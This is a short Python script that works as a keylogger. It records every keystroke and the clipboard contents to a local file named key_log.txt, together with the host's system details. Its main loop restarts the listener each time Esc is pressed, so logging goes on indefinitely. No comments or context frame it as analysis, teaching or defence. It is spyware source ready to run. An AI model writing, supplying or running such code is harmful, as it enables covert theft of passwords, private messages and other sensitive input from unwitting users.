import platform
import pyperclip
from pynput import keyboard
import time

log_file = "key_log.txt"

def log_system_details():
    with open(log_file, "a") as f:
        f.write("System Details:\n")
        f.write(f"System: {platform.system()}\n")
        f.write(f"Node Name: {platform.node()}\n")
        f.write(f"Release: {platform.release()}\n")
        f.write(f"Version: {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write("\n")

def log_clipboard_text():
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            with open(log_file, "a") as f:
                f.write(f"Clipboard Text: {clipboard_text}\n")
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"Failed to get clipboard text: {str(e)}\n")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write('\n')
        else:
            with open(log_file, "a") as f:
                f.write(f' [{key}] ')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    log_system_details()
    while True:
        start_listener()
        log_clipboard_text()
        time.sleep(5)  # Log clipboard text every 5 seconds
